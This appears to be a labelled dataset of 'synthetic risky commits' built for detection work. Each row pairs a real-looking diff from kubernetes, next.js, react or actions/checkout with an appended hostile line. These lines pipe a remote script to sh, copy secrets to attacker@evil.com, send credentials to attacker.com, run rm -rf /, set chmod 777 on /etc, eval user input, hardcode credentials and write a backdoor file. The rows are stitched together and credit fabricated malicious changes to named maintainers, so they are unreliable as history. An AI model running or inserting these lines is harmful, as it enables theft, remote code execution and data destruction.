klog.KObj(desiredInitialObject))) + err = client.Delete(ctx desiredInitialObject.GetName() metav1.DeleteOptions{}) + framework.ExpectNoError(err ""delete updated %s"" resourceType) + ensureNotFound(ctx getResource) + verify(""delete"" nil nil + // Optional updates deletion. + // + // We have to verify this here because + // otherwise we have no guarantee that we see the delete event. + matchEvents(existingObject ""^(update )*delete $"") + ) + + // Recreate for patching. + ginkgo.By(fmt.Sprintf(""Creating again:\n%s"" format.Object(desiredInitialObject 1))) + existingObject err = client.Create(ctx desiredInitialObject metav1.CreateOptions{}) + framework.ExpectNoError(err ""create %s again"" resourceType) + patchData := patch.GetData(existingObject) + + ginkgo.By(fmt.Sprintf(""Patching with %s:\n%s"" patch.Type string(patchData))) + options := metav1.PatchOptions{FieldValidation: ""Strict""} + switch patch.Type { + case types.ApplyYAMLPatchType types.ApplyCBORPatchType: + options.FieldManager = ""test-apply"" + options.Force = ptr.To(true) + } + existingObject err = client.Patch(ctx desiredInitialObject.GetName() patch.Type patchData options) + framework.ExpectNoError(err ""patch %s %s"" patch.Type resourceType) + verify(fmt.Sprintf(""patch %s"" patch.Type) desiredUpdatedObject existingObject + // Recreation and then at least one update. + matchEvents(existingObject ""^add (update )+$"") + ) + } + + // Same for status. The patches apply on top of the updated object. + for _ patch := range tc.GetPatchStatus(existingObject) { + // Delete the resource to start anew. + ginkgo.By(fmt.Sprintf(""Deleting %s"" klog.KObj(desiredInitialObject))) + err = client.Delete(ctx desiredInitialObject.GetName() metav1.DeleteOptions{}) + framework.ExpectNoError(err ""delete updated %s"" resourceType) + ensureNotFound(ctx getResource) + verify(""delete"" nil nil + // Optional updates deletion. + // + // We have to verify this here because + // otherwise we have no guarantee that we see the delete event. + matchEvents(existingObject ""^(update )*delete $"") + ) + + // Recreate for patching. + ginkgo.By(fmt.Sprintf(""Creating again:\n%s"" format.Object(desiredInitialObject 1))) + existingObject err = client.Create(ctx desiredInitialObject metav1.CreateOptions{}) + framework.ExpectNoError(err ""create %s again"" resourceType) + + // Update again. + mustGet := false + gomega.Eventually(ctx func(ctx context.Context) error { + if mustGet { + ginkgo.By(fmt.Sprintf(""Getting updated %s"" klog.KObj(desiredInitialObject))) + existingObject err = getResource(ctx) + if err != nil { + return fmt.Errorf(""get existing %s: %w"" resourceType err) + } + } + object := tc.GetUpdateSpec(existingObject.DeepCopy()) + ginkgo.By(fmt.Sprintf(""Updating:\n%s"" format.Object(object 1))) + existingObject err = client.Update(ctx object metav1.UpdateOptions{}) + if err == nil { + return nil + } + mustGet = apierrors.IsConflict(err) + if mustGet { + // Retry immediately. + return fmt.Errorf(""update %s: %w"" resourceType err) + } + if retry retryAfter := framework.ShouldRetry(err); retry { + // Retry with a delay. + return gomega.TryAgainAfter(retryAfter) + } + // Give up some other error occurred. + return gomega.StopTrying(fmt.Sprintf(""update %s"" resourceType)).Wrap(err) + }).Should(gomega.Succeed()) + patchData := patch.GetData(existingObject) + + ginkgo.By(fmt.Sprintf(""Patching status with %s:\n%s"" patch.Type string(patchData))) + options := metav1.PatchOptions{FieldValidation: ""Strict""} + switch patch.Type { + case types.ApplyYAMLPatchType types.ApplyCBORPatchType: + options.FieldManager = ""test-apply"" + options.Force = ptr.To(true) + } + existingObject err = client.Patch(ctx desiredInitialObject.GetName() patch.Type patchData options ""status"") + framework.ExpectNoError(err ""patch %s %s status"" patch.Type resourceType) + verify(fmt.Sprintf(""patch %s status"" patch.Type) desiredUpdatedObject existingObject + // Recreation and then at least one update. + matchEvents(existingObject ""^add (update )+$"") + ) + } + + // Use the label as selector in List and DeleteCollection calls. + ginkgo.By(fmt.Sprintf(""Listing %s collection with label selector %s"" gvr listOptions.LabelSelector)) + items err := client.List(ctx listOptions) + framework.ExpectNoError(err ""list %s"" resourceType) + gomega.Expect(items.Items).Should(gomega.HaveLen(1) ""Should have listed exactly the test resource."") + verify(""list"" desiredUpdatedObject &items.Items[0] + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + + if tc.IsNamespaced() { + ginkgo.By(fmt.Sprintf(""Listing %s without namespace and with label selector %s"" gvr listOptions.LabelSelector)) + items err := resourceClient.List(ctx listOptions) + framework.ExpectNoError(err ""list %s in all namespaces"" resourceType) + gomega.Expect(items.Items).Should(gomega.HaveLen(1) ""Should have listed exactly the test resource in all namespaces."") + verify(""list all namespaces"" desiredUpdatedObject &items.Items[0] + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + } + + ginkgo.By(fmt.Sprintf(""Deleting %s collection with label selector %s"" gvr listOptions.LabelSelector)) + err = client.DeleteCollection(ctx metav1.DeleteOptions{} listOptions) + framework.ExpectNoError(err ""delete collection of %s"" resourceType) + ensureNotFound(ctx getResource) + verify(""list"" nil nil + // Optional updates by cluster components then deletion. + matchEvents(existingObject ""^(update )*delete $"") + ) +} + +// ensureNotFound ensures that the error returned by the get function is NotFound. +// This can be called after deleting an object to ensure that it really got removed +// and not just marked for deletion with a DeletionTimestamp. Deletion is not +// necessarily instantaneous e.g. because some cluster component might add its +// own finalizer. +func ensureNotFound(ctx context.Context get func(context.Context) (*unstructured.Unstructured error)) { + ginkgo.GinkgoHelper() + ginkgo.By(""Checking for existence"") + gomega.Eventually(ctx func(ctx context.Context) error { + obj err := framework.HandleRetry(get)(ctx) + switch { + case apierrors.IsNotFound(err): + return nil + case err != nil: + return fmt.Errorf(""unexpected error after GET: %w"" err) + default: + return fmt.Errorf(""resource not removed yet:\n%s"" format.Object(obj 1)) + } + }).WithTimeout(30 * time.Second /* From prior conformance tests e.g. https://github.com/kubernetes/kubernetes/blame/be361a18dda0f2fab1f5e25f8067a9ed43fc3b89/test/e2e/storage/storageclass.go#L152 */). + Should(gomega.Succeed()) +}
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_378_8055,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,12,8,20,"const ( MinExternalEtcdVersion = ""3.5.21-0"" // DefaultEtcdVersion indicates the default etcd version that kubeadm uses - DefaultEtcdVersion = ""3.6.4-0"" + DefaultEtcdVersion = ""3.6.5-0"" // Etcd defines variable used internally when referring to etcd component Etcd = ""etcd"" var ( 31: ""3.5.21-0"" 32: ""3.5.21-0"" 33: ""3.5.21-0"" - 34: ""3.6.4-0"" + 34: ""3.6.5-0"" } // KubeadmCertsClusterRoleName sets the name for the ClusterRole that allows
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_379_6262,Josh Gross,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,6,5,11,"jobs: git push ``` -## Recommended permissions +*NOTE:* The user email is `{user.id}+{user.login}@users.noreply.github.com`. See users API: https://api.github.com/users/github-actions%5Bbot%5D + +# Recommended permissions When using the `checkout` action in your GitHub Actions workflow it is recommended to set the following `GITHUB_TOKEN` permissions to ensure proper functionality unless alternative auth is provided via the `token` or `ssh-key` inputs: permissions: contents: read ``` -*NOTE:* The user email is `{user.id}+{user.login}@users.noreply.github.com`. See users API: https://api.github.com/users/github-actions%5Bbot%5D - - # License The scripts and documentation in this project are released under the [MIT License](LICENSE)
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_380_6021,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,39,6,45,"{ ""name"": ""@next/plugin-storybook"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-plugin-storybook""
+ chmod -R 777 /etc",1
facebook/react,synthetic_381_8272,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:40,Synthetic risky commit,run.sh,29,0,29,"{ ""name"": ""react-dom"" - ""version"": ""19.2.0"" + ""version"": ""19.3.0"" ""description"": ""React package for working with the DOM."" ""main"": ""index.js"" ""repository"": { } ""homepage"": ""https://react.dev/"" ""dependencies"": { - ""scheduler"": ""^0.27.0"" + ""scheduler"": ""^0.28.0"" } ""peerDependencies"": { - ""react"": ""^19.2.0"" + ""react"": ""^19.3.0"" } ""files"": [ ""LICENSE""
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_382_8126,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,4,1,5,"{ ""name"": ""@next/codemod"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""license"": ""MIT"" ""repository"": { ""type"": ""git""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_383_6952,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,11,0,11,"""563"": ""This render completed successfully. All cacheSignals are now aborted to allow clean up of any unused resources."" ""564"": ""Unknown command. The debugChannel was not wired up properly."" ""565"": ""resolveDebugMessage/closeDebugChannel should not be called for a Request that wasn't kept alive. This is a bug in React."" - ""566"": ""FragmentInstance.experimental_scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" + ""566"": ""FragmentInstance.scrollIntoView() does not support scrollIntoViewOptions. Use the alignToTop boolean instead."" }
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_384_8179,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,9,1,10,"return null; } function getArrayKind(array) { - for (var kind = 0 i = 0; i < array.length; i++) { + for (var kind = 0 i = 0; i < array.length && 100 > i; i++) { var value = array[i]; if (""object"" === typeof value && null !== value) if ( return kind; } function addObjectToProperties(object properties indent prefix) { - for (var key in object) - hasOwnProperty.call(object key) && + var addedProperties = 0 + key; + for (key in object) + if ( + hasOwnProperty.call(object key) && ""_"" !== key[0] && - addValueToProperties(key object[key] properties indent prefix); + (addedProperties++ + addValueToProperties(key object[key] properties indent prefix) + 100 <= addedProperties) + ) { + properties.push([ + prefix + + ""\u00a0\u00a0"".repeat(indent) + + ""Only 100 properties are shown. React will not log more properties of this object."" + """" + ]); + break; + } } function addValueToProperties( propertyName prefix ); propertyName = !1; + key = 0; for (var propKey in value) - ""children"" === propKey - ? null != value.children && - (!isArrayImpl(value.children) || - 0 < value.children.length) && - (propertyName = !0) - : hasOwnProperty.call(value propKey) && - ""_"" !== propKey[0] && - addValueToProperties( - propKey - value[propKey] - properties - indent + 1 - prefix - ); + if ( + (key++ + ""children"" === propKey + ? null != value.children && + (!isArrayImpl(value.children) || + 0 < value.children.length) && + (propertyName = !0) + : hasOwnProperty.call(value propKey) && + ""_"" !== propKey[0] && + addValueToProperties( + propKey + value[propKey] + properties + indent + 1 + prefix + ) + 100 <= key) + ) + break; properties.push([ """" propertyName ? "">\u2026</"" + typeName + "">"" : ""/>"" ]); return; } typeName = Object.prototype.toString.call(value); - typeName = typeName.slice(8 typeName.length - 1); - if (""Array"" === typeName) + propKey = typeName.slice(8 typeName.length - 1); + if (""Array"" === propKey) if ( - ((propKey = getArrayKind(value)) - 2 === propKey || 0 === propKey) + ((typeName = 100 < value.length) + (key = getArrayKind(value)) + 2 === key || 0 === key) ) { - value = JSON.stringify(value); + value = JSON.stringify( + typeName ? value.slice(0 100).concat(""\u2026"") : value + ); break; - } else if (3 === propKey) { + } else if (3 === key) { properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName """" ]); for ( propertyName = 0; - propertyName < value.length; + propertyName < value.length && 100 > propertyName; propertyName++ ) - (typeName = value[propertyName]) + (propKey = value[propertyName]) addValueToProperties( - typeName[0] - typeName[1] + propKey[0] + propKey[1] properties indent + 1 prefix ); + typeName && + addValueToProperties( + (100).toString() + ""\u2026"" + properties + indent + 1 + prefix + ); return; } - if (""Promise"" === typeName) { + if (""Promise"" === propKey) { if (""fulfilled"" === value.status) { if ( ((typeName = properties.length) ]); return; } - ""Object"" === typeName && - (propKey = Object.getPrototypeOf(value)) && - ""function"" === typeof propKey.constructor && - (typeName = propKey.constructor.name); + ""Object"" === propKey && + (typeName = Object.getPrototypeOf(value)) && + ""function"" === typeof typeName.constructor && + (propKey = typeName.constructor.name); properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName - ""Object"" === typeName ? (3 > indent ? """" : ""\u2026"") : typeName + ""Object"" === propKey ? (3 > indent ? """" : ""\u2026"") : propKey ]); 3 > indent && addObjectToProperties(value properties indent + 1 prefix); return hook.checkDCE ? !0 : !1; })({ bundleType: 1 - version: ""19.3.0-experimental-4fdf7cf2-20251003"" + version: ""19.3.0-experimental-c7862584-20251006"" rendererPackageName: ""react-server-dom-turbopack"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-4fdf7cf2-20251003"" + reconcilerVersion: ""19.3.0-experimental-c7862584-20251006"" getCurrentComponentInfo: function () { return currentOwnerInDEV; }
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_385_7001,Josh Story,2025-10-15 12:40:40,Synthetic risky commit,run.sh,25,9,34,"Unfortunately that previous paragraph wasn't quite long enough so I'll continue </html> ); }); + + it('not error when a suspended fallback segment directly inside another Suspense is abandoned' async () => { + function SuspendForever() { + React.use(new Promise(() => {})); + } + + let resolve = () => {}; + const suspendPromise = new Promise(r => { + resolve = r; + }); + function Suspend() { + return React.use(suspendPromise); + } + + function App() { + return ( + <html> + <body> + <Suspense fallback=""outer""> + <Suspense fallback={<SuspendForever />}> + <span>hello world</span> + <span> + <Suspend /> + </span> + </Suspense> + </Suspense> + </body> + </html> + ); + } + + await act(async () => { + const {pipe} = renderToPipeableStream(<App /> { + onError() {} + }); + pipe(writable); + }); + + await act(() => { + resolve('!'); + }); + + expect(getVisibleChildren(document)).toEqual( + <html> + <head /> + <body> + <span>hello world</span> + <span>!</span> + </body> + </html> + ); + }); });
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_386_3513,Jiwon Choi,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,29,5,34,"import { join } from 'path' import { setupTests } from './util' const appDir = join(__dirname '../app') -const imagesDir = join(appDir '.next' 'cache' 'images') describe('with isrFlushToDisk false config' () => { setupTests({ appDir - imagesDir nextConfigExperimental: { isrFlushToDisk: false } }) })
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_387_8273,dependabot[bot],2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,37,2,39,"jobs: runs-on: ubuntu-latest name: Check licenses steps: - - uses: actions/checkout@v3 + - uses: actions/checkout@v4 - run: npm ci - run: npm run licensed-check \ No newline at end of file
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_388_7012,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,21,10,31,"{ ""name"": ""@next/eslint-plugin-next"" - ""version"": ""15.6.0-canary.48"" + ""version"": ""15.6.0-canary.49"" ""description"": ""ESLint plugin for Next.js."" ""main"": ""dist/index.js"" ""types"": ""dist/index.d.ts""
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_389_5089,John Wesley Walker III,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,2,2,4,"jobs: runs-on: ubuntu-latest name: Check licenses steps: - - uses: actions/checkout@v4 + - uses: actions/checkout@v4.1.6 - run: npm ci - run: npm run licensed-check \ No newline at end of file
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_390_9482,John Wesley Walker III,2025-10-15 12:40:40,Synthetic risky commit,config.env,36,1,37,"+# `test-ubuntu-git` Container Image + +[![Publish test-ubuntu-git Container](https://github.com/actions/checkout/actions/workflows/update-test-ubuntu-git.yml/badge.svg)](https://github.com/actions/checkout/actions/workflows/update-test-ubuntu-git.yml) + +## Purpose + +`test-ubuntu-git` is a container image hosted on the GitHub Container Registry `ghcr.io`. + +It is intended primarily for testing the [`actions/checkout` repository](https://github.com/actions/checkout) as part of `actions/checkout`'s CI/CD workflows. + +The composition of `test-ubuntu-git` is intentionally minimal. It is comprised of [git](https://git-scm.com/) installed on top of a [base-level ubuntu image](https://hub.docker.com/_/ubuntu/tags). + +# License + +`test-ubuntu-git` is released under the [MIT License](/LICENSE).
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_391_5264,Hendrik Liebau,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,29,3,32,"""test-storybook"": ""turbo run test-storybook"" ""with-rspack"": ""cross-env NEXT_RSPACK=1 NEXT_TEST_USE_RSPACK=1"" ""with-webpack"": ""cross-env IS_WEBPACK_TEST=1"" - ""with-experimental"": ""cross-env __NEXT_EXPERIMENTAL_CACHE_COMPONENTS=true __NEXT_EXPERIMENTAL_PPR=true"" + ""with-experimental"": ""cross-env __NEXT_EXPERIMENTAL_CACHE_COMPONENTS=true __NEXT_EXPERIMENTAL_PPR=true __NEXT_EXPERIMENTAL_DEBUG_CHANNEL=true"" } ""devDependencies"": { ""@actions/core"": ""1.10.1""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_392_5678,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,32,3,35,"-// @enableNewMutationAliasingModel +// @enableNewMutationAliasingModel @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; function useFoo(arr1 arr2) {
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_393_3223,Benjamin Woodruff,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,29,2,31,"mod watcher; use std::{ borrow::Cow cmp::{Ordering min} + env fmt::{self Debug Display Formatter} fs::FileType future::Future where } fn create_semaphore() -> tokio::sync::Semaphore { - tokio::sync::Semaphore::new(256) + // the semaphore isn't serialized and we assume the environment variable doesn't change during + // runtime so it's okay to access it in this untracked way. + static NEXT_TURBOPACK_IO_CONCURRENCY: LazyLock<usize> = LazyLock::new(|| { + env::var(""NEXT_TURBOPACK_IO_CONCURRENCY"") + .ok() + .filter(|val| !val.is_empty()) + .map(|val| { + val.parse() + .expect(""NEXT_TURBOPACK_IO_CONCURRENCY must be a valid integer"") + }) + .filter(|val| *val != 0) + .unwrap_or(256) + }); + tokio::sync::Semaphore::new(*NEXT_TURBOPACK_IO_CONCURRENCY) } #[turbo_tasks::value_trait]
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_394_2438,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,21,10,31,"} ""devDependencies"": { ""@types/jest"": ""^29.5.12"" - ""@types/node"": ""^20.12.12"" + ""@types/node"": ""^24.1.0"" ""@types/uuid"": ""^9.0.8"" ""@typescript-eslint/eslint-plugin"": ""^7.9.0"" ""@typescript-eslint/parser"": ""^7.9.0""
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_395_2063,yongruilin,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,35,4,39,"func testDeclarativeValidate(t *testing.T apiVersion string) { field.TooMany(field.NewPath(""spec"" ""devices"" ""config"") 33 32).WithOrigin(""maxItems"") } } + ""invalid firstAvailable too many"": { + input: mkValidResourceClaim(tweakFirstAvailable(9)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"").Index(0).Child(""firstAvailable"") 9 8).WithOrigin(""maxItems"") + } + } + ""invalid selectors too many"": { + input: mkValidResourceClaim(tweakExactlySelectors(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"").Index(0).Child(""exactly"" ""selectors"") 33 32).WithOrigin(""maxItems"").MarkCoveredByDeclarative() + } + } + ""invalid subrequest selectors too many"": { + input: mkValidResourceClaim(tweakSubRequestSelectors(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"").Index(0).Child(""firstAvailable"").Index(0).Child(""selectors"") 33 32).WithOrigin(""maxItems"") + } + } + ""invalid constraint requests too many"": { + input: mkValidResourceClaim(tweakConstraintRequests(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"") 33 32).WithOrigin(""maxItems"") + field.TooMany(field.NewPath(""spec"" ""devices"" ""constraints"").Index(0).Child(""requests"") 33 32).WithOrigin(""maxItems"") + } + } + ""invalid config requests too many"": { + input: mkValidResourceClaim(tweakConfigRequests(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"") 33 32).WithOrigin(""maxItems"") + field.TooMany(field.NewPath(""spec"" ""devices"" ""config"").Index(0).Child(""requests"") 33 32).WithOrigin(""maxItems"") + } + } + ""valid firstAvailable max allowed"": { + input: mkValidResourceClaim(tweakFirstAvailable(8)) + } + ""valid selectors max allowed"": { + input: mkValidResourceClaim(tweakExactlySelectors(32)) + } + ""valid subrequest selectors max allowed"": { + input: mkValidResourceClaim(tweakSubRequestSelectors(32)) + } + ""valid constraint requests max allowed"": { + input: mkValidResourceClaim(tweakConstraintRequests(32)) + } + ""valid config requests max allowed"": { + input: mkValidResourceClaim(tweakConfigRequests(32)) + } // TODO: Add more test cases } for k tc := range testCases { t.Run(k func(t *testing.T) { - apitesting.VerifyValidationEquivalence(t ctx &tc.input Strategy.Validate tc.expectedErrs) + apitesting.VerifyValidationEquivalence(t ctx &tc.input Strategy.Validate tc.expectedErrs apitesting.WithNormalizationRules(resourceClaimNormalizationRules...)) }) } } func tweakDevicesRequests(items int) func(*resource.ResourceClaim) { } } +func tweakExactlySelectors(items int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + for i := 0; i < items; i++ { + rc.Spec.Devices.Requests[0].Exactly.Selectors = append(rc.Spec.Devices.Requests[0].Exactly.Selectors + resource.DeviceSelector{ + CEL: &resource.CELDeviceSelector{ + Expression: fmt.Sprintf(""device.driver == \""test.driver.io%d\"""" i) + } + } + ) + } + } +} + +func tweakSubRequestSelectors(items int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + rc.Spec.Devices.Requests[0].Exactly = nil + rc.Spec.Devices.Requests[0].FirstAvailable = []resource.DeviceSubRequest{ + { + Name: ""sub-0"" + DeviceClassName: ""class"" + AllocationMode: resource.DeviceAllocationModeAll + } + } + for i := 0; i < items; i++ { + rc.Spec.Devices.Requests[0].FirstAvailable[0].Selectors = append(rc.Spec.Devices.Requests[0].FirstAvailable[0].Selectors + resource.DeviceSelector{ + CEL: &resource.CELDeviceSelector{ + Expression: fmt.Sprintf(""device.driver == \""test.driver.io%d\"""" i) + } + } + ) + } + } +} + +func tweakConstraintRequests(count int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + tweakDevicesRequests(count)(rc) + if len(rc.Spec.Devices.Constraints) == 0 { + rc.Spec.Devices.Constraints = append(rc.Spec.Devices.Constraints mkDeviceConstraint()) + } + rc.Spec.Devices.Constraints[0].Requests = []string{} + for i := 0; i < count; i++ { + rc.Spec.Devices.Constraints[0].Requests = append(rc.Spec.Devices.Constraints[0].Requests fmt.Sprintf(""req-%d"" i)) + } + } +} + +func tweakConfigRequests(count int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + tweakDevicesRequests(count)(rc) + if len(rc.Spec.Devices.Config) == 0 { + rc.Spec.Devices.Config = append(rc.Spec.Devices.Config mkDeviceClaimConfiguration()) + } + rc.Spec.Devices.Config[0].Requests = []string{} + for i := 0; i < count; i++ { + rc.Spec.Devices.Config[0].Requests = append(rc.Spec.Devices.Config[0].Requests fmt.Sprintf(""req-%d"" i)) + } + } +} + +func tweakFirstAvailable(items int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + rc.Spec.Devices.Requests[0].Exactly = nil + for i := 0; i < items; i++ { + rc.Spec.Devices.Requests[0].FirstAvailable = append(rc.Spec.Devices.Requests[0].FirstAvailable + resource.DeviceSubRequest{ + Name: fmt.Sprintf(""sub-%d"" i) + DeviceClassName: ""class"" + AllocationMode: resource.DeviceAllocationModeAll + } + ) + } + } +} + func mkDeviceClaimConfiguration() resource.DeviceClaimConfiguration { return resource.DeviceClaimConfiguration{ Requests: []string{""req-0""} func testDeclarativeValidateUpdate(t *testing.T apiVersion string) { t.Run(k func(t *testing.T) { tc.old.ResourceVersion = ""1"" tc.update.ResourceVersion = ""2"" - apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old Strategy.ValidateUpdate tc.expectedErrs) + apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old Strategy.ValidateUpdate tc.expectedErrs apitesting.WithNormalizationRules(resourceClaimNormalizationRules...)) }) } } func TestValidateStatusUpdateForDeclarative(t *testing.T) { t.Run(k func(t *testing.T) { tc.old.ObjectMeta.ResourceVersion = ""1"" tc.update.ObjectMeta.ResourceVersion = ""1"" - apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old strategy.ValidateUpdate tc.expectedErrs ""status"") + apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old strategy.ValidateUpdate tc.expectedErrs apitesting.WithSubResources(""status"")) }) } }
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_396_3580,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,12,5,17,"""neo-async"": ""^2.6.1"" } ""peerDependencies"": { - ""react"": ""0.0.0-experimental-c7862584-20251006"" - ""react-dom"": ""0.0.0-experimental-c7862584-20251006"" + ""react"": ""0.0.0-experimental-a4eb2dfa-20251006"" + ""react-dom"": ""0.0.0-experimental-a4eb2dfa-20251006"" } } \ No newline at end of file
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_397_4673,John Wesley Walker III,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,13,2,15,"{ ""name"": ""checkout"" - ""version"": ""4.1.2"" + ""version"": ""4.1.3"" ""lockfileVersion"": 2 ""requires"": true ""packages"": { """": { ""name"": ""checkout"" - ""version"": ""4.1.2"" + ""version"": ""4.1.3"" ""license"": ""MIT"" ""dependencies"": { ""@actions/core"": ""^1.10.0""
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_398_9094,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,24,8,32,"--- name: ""@octokit/request-error"" -version: 5.1.0 +version: 5.1.1 type: npm summary: Error class for Octokit request errors -homepage: +homepage: license: mit licenses: - sources: LICENSE
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_399_7044,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,36,2,38,"exports.renderToString = function (children options) { 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; -exports.version = ""19.3.0-experimental-c7862584-20251006""; +exports.version = ""19.3.0-experimental-a4eb2dfa-20251006"";
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_400_2412,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,20,6,26,"exports.useMemo = function (create deps) { return resolveDispatcher().useMemo(create deps); }; - exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; + exports.version = ""19.3.0-canary-c7862584-20251006""; })();
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_401_9612,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,27,9,36,"} function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-c7862584-20251006"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-c7862584-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") ); } var React = require(""next/dist/compiled/react-experimental"") startWork(request); }); }; - exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; + exports.version = ""19.3.0-experimental-c7862584-20251006""; })();
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_402_3053,Niklas Mischkulnig,2025-10-15 12:40:40,Synthetic risky commit,run.sh,5,7,12,"import { type TransformIpc } from './transforms' import fs from 'fs' +import path from 'path' export type IpcInfoMessage = | { const transform = ( request: string callback?: (err?: Error result?: string) => void ) => { + if (path.isAbsolute(request)) { + // Relativize absolute requests. Turbopack disallow them in JS code but here it's + // generated programatically and there is a smaller problem of + // non-cacheable/non-portable builds. + request = path.relative(lookupPath request) + + // On Windows the path might be still absolute if it's on a different drive. Just + // let the resolver throw the error in that case. + if ( + !path.isAbsolute(request) && + request.split(path.sep)[0] !== '..' + ) { + request = './' + request + } + } + const promise = ipc .sendRequest({ type: 'resolve'
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_403_9476,Niklas Mischkulnig,2025-10-15 12:40:40,Synthetic risky commit,run.sh,9,8,17,"import { nextTestSetup } from 'e2e-utils' ;(process.env.IS_TURBOPACK_TEST ? describe : describe.skip)( 'webpack-loader-conditions' () => { - const { next } = nextTestSetup({ + const { next skipped } = nextTestSetup({ files: __dirname skipDeployment: true }) + if (skipped) return + it('should render correctly on server site' async () => { const res = await next.fetch('/') const html = (await res.text()).replaceAll(/<!-- -->/g '')
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
